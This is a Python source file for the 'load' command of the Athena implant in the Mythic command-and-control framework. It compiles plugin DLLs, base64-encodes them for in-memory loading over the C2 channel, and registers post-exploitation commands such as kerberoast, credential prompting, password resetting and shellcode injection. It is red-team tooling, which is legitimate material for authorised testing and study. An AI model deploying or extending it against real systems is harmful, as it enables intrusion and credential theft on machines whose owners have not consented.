import subprocess
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import base64
import os
import pathlib

class LoadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [
            CommandParameter(
                name="command", cli_name="command", display_name="Command to Load", type=ParameterType.ChooseOne,
                choices_are_all_commands=True,
                description="Load Command",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=0
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
                tmpjson = json.loads(self.command_line)
                self.load_args_from_json_string(json.dumps(tmpjson))
        else:
                self.load_args_from_json_string(self.command_line)



class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load cmd"
    description = "This loads a new plugin into memory via the C2 channel."
    version = 1
    author = "@checkymander"
    parameters = []
    #attackmapping = ["T1030", "T1129", "T1059.002", "T1620"]
    attackmapping = []
    argument_class = LoadArguments
    attributes = CommandAttributes(
        load_only=False,
        builtin=True
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        command = task.args.get_arg('command')
        dllFile = os.path.join(self.agent_code_path, "AthenaPlugins", "bin", f"{command}.dll")      
        if(os.path.isfile(dllFile) == False):
            await self.compile_command(command, os.path.join(self.agent_code_path, "AthenaPlugins"))
        dllBytes = open(dllFile, 'rb').read()
        encodedBytes = base64.b64encode(dllBytes)
        task.args.add_arg("asm", encodedBytes.decode())
        #TODO: https://github.com/MythicMeta/MythicContainerPyPi/blob/main/mythic_container/MythicGoRPC/send_mythic_rpc_task_create_subtask.py
        



        if(command == "ds"):
            resp = await MythicRPC().execute("create_subtask_group", tasks=[
                {"command": "load-assembly", "params": {"libraryname":"System.DirectoryServices.Protocols.dll", "target": "plugin"}},
                ], 
                subtask_group_name = "ds", parent_task_id=task.id)
        elif(command == "ssh"):
            resp = await MythicRPC().execute("create_subtask_group", tasks=[
                {"command": "load-assembly", "params" : {"libraryname":"Renci.SshNet.dll", "target":"plugin"}},
                {"command": "load-assembly", "params" : {"libraryname":"SshNet.Security.Cryptography.dll", "target": "plugin"}},
                ],
                subtask_group_name = "ssh", parent_task_id=task.id)
        elif(command == "sftp"):
            resp = await MythicRPC().execute("create_subtask_group", tasks=[
                {"command": "load-assembly", "params" : {"libraryname":"Renci.SshNet.dll", "target": "plugin"}},
                {"command": "load-assembly", "params" : {"libraryname":"SshNet.Security.Cryptography.dll", "target": "plugin"}},
                ],
                subtask_group_name = "sftp", parent_task_id=task.id)
        elif(command == "coff"):
             commands = ["nanorubeus", "patchit", "add-machine-account","ask-creds","delete-machine-account","get-machine-account-quota","kerberoast","klist","adcs-enum", "driver-sigs", "get-password-policy","net-view","sc-enum",
                         "schtasks-enum","schtasks-query","vss-enum","windowlist","wmi-query","add-user-to-group","enable-user","office-tokens","sc-config","sc-create","sc-delete","sc-start","sc-stop","schtasks-run",
                         "schtasks-stop","set-user-pass"]
             addCommandMessage = MythicRPCCallbackAddCommandMessage(task.callback.agent_callback_id,commands)
             response = await SendMythicRPCCallbackAddCommand(addCommandMessage)
             if not response.Success:
                    raise Exception("Failed to add commands to callback: " + response.Error)
        elif(command == "shellcode-inject"):
             addCommandMessage = MythicRPCCallbackAddCommandMessage(task.callback.agent_callback_id,["inject-assembly"])
             response = await SendMythicRPCCallbackAddCommand(addCommandMessage)
             if not response.Success:
                raise Exception("Failed to add commands to callback: " + response.Error)
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def get_commands(self, response: AgentResponse):
        pass

    async def compile_command(self, command_name, path):
        #p = subprocess.Popen(["dotnet", "build", command_name], cwd=path)
        #fuck it build all of them
        p = subprocess.Popen(["dotnet", "build", command_name], cwd=path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling BOF: " + str(streamdata))

